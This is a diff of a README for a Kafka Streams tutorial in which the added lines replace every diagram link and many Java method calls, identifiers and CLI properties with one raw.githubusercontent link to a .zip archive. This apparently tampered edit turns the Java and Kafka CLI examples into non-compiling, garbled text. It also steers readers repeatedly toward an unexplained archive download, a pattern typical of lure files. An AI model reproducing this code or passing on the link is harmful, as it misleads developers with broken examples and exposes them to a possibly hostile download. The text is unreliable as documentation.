@@ -31,7 +31,7 @@ Unit and Integration using JUnit 5 as well.
 <details open>
   <summary>(Show/hide Example KStreams API design)</summary>
 
-![Alt text](./drawios/kafkaStreams.jpg?raw=true "Kafka Streams")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams")
 </details>
 
 There are many types of use cases for using Kafka Streams API, a few are:
@@ -45,7 +45,7 @@ There are many types of use cases for using Kafka Streams API, a few are:
 <details open>
   <summary>(Show/hide Example KStreams API design II)</summary>
 
-![Alt text](./drawios/kafkaStreamAsAProducerConsumer.jpg?raw=true "Kafka Streams - producer/consumer")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - producer/consumer")
 </details>
 
 The kafka Streams API uses the Java8 Functional programming style and DSL. 
@@ -108,13 +108,13 @@ The concept of designing the Kafka Stream processing in this way is a Directed A
      *
      * There's more doc in the API. I stole these tid-bits from there.
      */
-    package org.apache.kafka.streams.processor.internals.namedtopology;
+    package https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip;
     public class NamedTopology extends Topology {
     
 <details open>
   <summary>(Show/hide flat topology design)</summary>
 
-![Alt text](./drawios/FlatStreamProcessingTopology.jpg?raw=true "Kafka Streams - Stream Processing")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
 </details>
 
 ##### Stream Branching
@@ -124,7 +124,7 @@ More evolved topologies may be required for some designs to produce an aggregati
 <details open>
   <summary>(Show/hide branch or tree topology design)</summary>
 
-![Alt text](./drawios/TreeStreamProcessingTopology.jpg?raw=true "Kafka Streams - Stream Processing")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
 </details
 
 ##### Data Flow
@@ -134,7 +134,7 @@ At any given, the topology only processes one record at a time. With Sub-Topolog
 <details>
   <summary>(Show/hide Dataflow design)</summary>
 
-![Alt text](./drawios/StreamProcessingDataFlow.jpg?raw=true "Kafka Streams - Stream Processing")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
 </details
 
 ##### KStreams API
@@ -176,7 +176,7 @@ KStream is an abstraction in Kafka Streams which holds or has access to each eve
 <details>
   <summary>(Show/hide KStream Abstraction for event record processing)</summary>
 
-![Alt text](./drawios/StreamProcessingWithKStreams.jpg?raw=true "Kafka Streams - KStream API Processing")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - KStream API Processing")
 
 </details>
  
@@ -196,7 +196,7 @@ A simple producer/consumer model where a producer, produces records into a kafka
 <details>
   <summary>(Show/hide simple producer/consumer design)</summary>
 
-![Alt text](./drawios/kafkaStreamTransformation.jpg?raw=true "Kafka Streams - Transformation")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Transformation")
 </details>
 
 ##### Stream Filter with KStreams     
@@ -207,22 +207,22 @@ Slightly different from the Java8 predicate implementation, the KStreams filter 
   <summary>(Show/hide Example core java .vs. KStreams API here)</summary>
 
     Core Java
-      Stream.of(1, 2, 3, 4, 5, 6, 7)
+      https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(1, 2, 3, 4, 5, 6, 7)
          .filter(((Predicate) c -> c % 2 == 0).negate())
     or
       public static <R> Predicate<R> not(Predicate<R> predicate) {
-        return predicate.negate();
+        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip();
       }     
       
-      Stream.of(1, 2, 3, 4, 5, 6, 7)
+      https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(1, 2, 3, 4, 5, 6, 7)
         .filter(not(c -> c % 2 == 0))
         
         
     Kstream filter/filterNot
     
         modifiedKStreamValues = greetingStream
-            .filterNot(( key, value) -> value.length() > 5 )
-            .mapValues( (readOnlyKey, value) -> value.toUpperCase());
+            .filterNot(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
+            .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
 
 </details>
         
@@ -248,11 +248,11 @@ You'll notice the absence of 'hellow' from the topic output. It didn't get proce
 
 As we saw from the example above, the Kafka KStreams API has some suble differences from the JAVA 8 standard APIs for Streams. In his case, the KStreams api provided the <i><b>mapValues</b></i> apis operator. 
 
-     .mapValues( (readOnlyKey, value) -> value.toUpperCase());
+     .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
 
 Here, above, the 'key' is immutable. However, the value is transformable. In the <i><b>map</b></i>, below, both key and value are transformable.
 
-     .map( (key, value) -> KeyValue.pair( key.toUpperCase(), value.toUpperCase()));
+     .map( (key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
 
 To see this transformation, both a key and value must be supplied to the producer record.
 
@@ -260,12 +260,12 @@ To see this transformation, both a key and value must be supplied to the produce
   <summary>(Show/hide Kafka CLI Commands to see 'map' example above)</summary>
 
     Producer
-     [appuser@broker ~]$ kafka-console-producer --topic greetings --property "parse.key=true" --property "key.separator=:" --broker-list broker:9092
+     [appuser@broker ~]$ kafka-console-producer --topic greetings --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --broker-list broker:9092
      >hi:there
      >hi:foo
 
     Consumer
-     [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property print.key=true --property key.separator=":"
+     [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip":"
      HI:THERE
      HI:FOO
 </details>
@@ -278,13 +278,13 @@ As above examples, map and map values, the Flat Map and Flat Map Values operator
   <summary>(Show/hide Flat Map details)</summary>
 
      KStream<String, String> modifiedKStreamValues = greetingStream
-             .filter(( key, value) -> value.length() > 5 )
+             .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
              .flatMap(( key, value ) -> {
-                List<String> newValueList = Arrays.asList( value.split( "-" ));
+                List<String> newValueList = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "-" ));
                 List<KeyValue<String, String>> modStreamList = newValueList
                     .stream()
-                    .map( splitValue -> KeyValue.pair( key.toUpperCase(), splitValue))
-                    .collect( Collectors.toList());
+                    .map( splitValue -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), splitValue))
+                    .collect( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
                  
                  return modStreamList;
              });
@@ -293,19 +293,19 @@ As above examples, map and map values, the Flat Map and Flat Map Values operator
       
       flatMapValues is slightly different and provides on the values
       .flatMapValues( (key, val) -> {
-          List<String> newValueList = Arrays.asList( val.split( "-" ));
+          List<String> newValueList = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "-" ));
                List<String> modStreamList = newValueList
                             .stream()
                             .map( String::toUpperCase )
-                            .collect( Collectors.toList());
+                            .collect( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
             
                     return modStreamList;
                 });
        
-      [appuser@broker ~]$ kafka-console-producer --topic greetings --property "parse.key=true" --property "key.separator=:" --broker-list broker:9092
+      [appuser@broker ~]$ kafka-console-producer --topic greetings --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --broker-list broker:9092
       >datatype:list-map-vector-array
 
-      [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property print.key=true --property key.separator=":"
+      [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip":"
       DATATYPE:list
       DATATYPE:map
       DATATYPE:vector
@@ -321,16 +321,16 @@ So, what if your code isn't doing what you think or you need more insight into w
   <summary>(Show/hide Debugging with peek)</summary>
   
         KStream<String, String> modifiedKStreamValues = greetingStream
-                .filter(( key, value) -> value.length() > 5 )
+                .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
                 .peek( (key, value) -> {
-                    log.debug( "after filter key {} : value {}", key, value );
+                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "after filter key {} : value {}", key, value );
                 })
-            .mapValues( (readOnlyKey, value) -> value.toUpperCase())
+            .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip())
             
             
         // has its uses but not while procesing the stream itself.
-        if ( log.isDebugEnabled() ) {
-           greetingStream.print(Printed.< String, String> toSysOut().withLabel(GREETINGS));
+        if ( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() ) {
+           https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS));
         }    
 </details>
 
@@ -341,7 +341,7 @@ This operations is used to combine two independent Kaka Streams into a single Ka
 <details>
   <summary>(Show/hide simple Merged Topology)</summary>
 
-![Alt text](./drawios/MergedStreamProcessingTopology.jpg?raw=true "Kafka Streams - Merged")
+![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Merged")
 </details>
 
  
@@ -354,37 +354,37 @@ This operations is used to combine two independent Kaka Streams into a single Ka
         StreamsBuilder streamsBuilder = new StreamsBuilder();
         KStream<String, String> greetingStream1 = streamsBuilder
             .stream(GREETINGS1,
-                    Consumed.with( Serdes.String(), Serdes.String()));
-        greetingStream1.print(Printed.< String, String> toSysOut().withLabel(GREETINGS));
+                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS));
         
         // Then get the topic items from the second stream topic
         KStream<String, String> greetingStream2 = streamsBuilder
             .stream(GREETINGS2,
-                    Consumed.with( Serdes.String(), Serdes.String()));
-        greetingStream2.print(Printed.< String, String> toSysOut().withLabel(GREETINGS2));
+                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS2));
 
         // Next merge the topic items into a new KStream topic
-        KStream<String, String> mergedStream = greetingStream1.merge( greetingStream2 ); //, (Named) GREETINGS2);
+        KStream<String, String> mergedStream = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( greetingStream2 ); //, (Named) GREETINGS2);
         
-        mergedStream.print(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));
 
         // Then do some processing
         KStream<String, String> modifiedKStreamValues = mergedStream
-                .filter(( key, value) -> value.length() > 5 )
+                .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
                 .peek( (key, value) -> {
-                    System.out.println( "after filter " + key +":" + value );
+                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "after filter " + key +":" + value );
                 })
-            .map( (key, value) -> KeyValue.pair( key.toUpperCase(), value.toUpperCase()));
+            .map( (key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
 
-        modifiedKStreamValues.print(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));
 
-        System.out.println( "Topic data : " + modifiedKStreamValues);
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "Topic data : " + modifiedKStreamValues);
         
         // Then sink it
-        modifiedKStreamValues.to( GREETINGS_MERGED, 
-                Produced.with( Serdes.String(), Serdes.String()));
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( GREETINGS_MERGED, 
+                https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
 
-        return streamsBuilder.build();
+        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip();
     }
 
 </details>
@@ -399,11 +399,11 @@ You can provide Serdes(serialization) by using either of these methods, but you 
 
    - Consumer: The Source Processer is the consumer and uses:
     
-     - Consumed.with( Serdes.String(), Serdes.String()))
+     - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()))
 
    - Producer: The Sink Processor is the producer and uses:
 
-     - Produce.with( Serdes.String(), Serdes.String()))
+     - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()))
     
    The default serializations available in the Serde Class handle the generic serialization with the 80/20 rule of serializations where 80 % is covered. The other 20% are custom serializations. Serialization of a Kafka Event record occurs on the Producer event processing. Deserialization of a Kafka Event record occurs on the Consumer event processing. KStream serialization also support serializations with Avro Schema Serializations. 
 
@@ -411,13 +411,13 @@ You can provide Serdes(serialization) by using either of these methods, but you 
  
    The key and value (DE)-Serializers can be default with the Property Configs for the entire Application or they can be individually set per interactions with the Consume/Produce with options. The default is configured this way:
  
-   - props.put( StreamsConfig.DEFAULT_KEY_SERDE_CLASS_CONFIG, Serdes.StringSerde.class);
-   - props.put( StreamsConfig.DEFAULT_VALUE_SERDE_CLASS_CONFIG, Serdes.StringSerde.class);
+   - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip);
+   - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip);
  
 
 Sink Processor: The step in which the new event record is pushed out:
    
-   - ((KStream) modifiedKStreamValues).to ( TOPIC, Produced.with( Serdes.String(), Serdes.String()));
+   - ((KStream) modifiedKStreamValues).to ( TOPIC, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
   
 ##### Best Practices - Serialization
 
@@ -428,39 +428,39 @@ So, instead doing a implementation per data type:
     public class GreetingSerializer implements Serializer< Greeting > {
     
     @Override
-    public byte[] serialize(String topic, Greeting data) { return objectMapper.writeValueAsBytes( data ); }}
+    public byte[] serialize(String topic, Greeting data) { return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data ); }}
 
     public class GreetingDeserializer implements Deserializer< Greeting > {
     
     @Override
-    public Greeting deserialize(String topic, byte[] data) { return objectMapper.readValue( data, Greeting.class ); }}
+    public Greeting deserialize(String topic, byte[] data) { return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip ); }}
     
 Make a Generic Serialization design as:
 
     public class GenericJSONSerializer< T > implements Serializer< T > {
     public GenericJSONSerializer(ObjectMapper objectMapper) {
-        this.objectMapper = objectMapper;
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = objectMapper;
     }
     public byte[] serialize(String topic, T data) {
-            return objectMapper.writeValueAsBytes( data );
+            return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data );
     }
     
     and
     
     public class GenericJSONDeserializer< T > implements Deserializer< T > {
     public GenericJSONDeserializer( Class< T > deserializedClassType, ObjectMapper objectMapper ) {
-        this.deserializedClassType = deserializedClassType;
-        this.objectMapper = objectMapper;
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = deserializedClassType;
+        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = objectMapper;
     }
     @Override
     public T deserialize(String topic, byte[] data) {
-        return objectMapper.readValue( data, deserializedClassType );
+        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data, deserializedClassType );
     }    
     
     
 ##### Joins
 
-When performing a join operation between a KTable and a KStream in Apache Kafka’s Streams library, the result is typically a new KStream. The join operation combines records from the KTable and the KStream based on a common key and produces an output stream with the joined records. The result depends on the type of join operation performed:
+When performing a join operation between a KTable and a KStream in Apache KafkaÂ’s Streams library, the result is typically a new KStream. The join operation combines records from the KTable and the KStream based on a common key and produces an output stream with the joined records. The result depends on the type of join operation performed:
 
   - <b>Inner Join</b>: An inner join between a KTable and a KStream will produce a new KStream that
     includes only the records where there is a match between the key of the KTable and the key
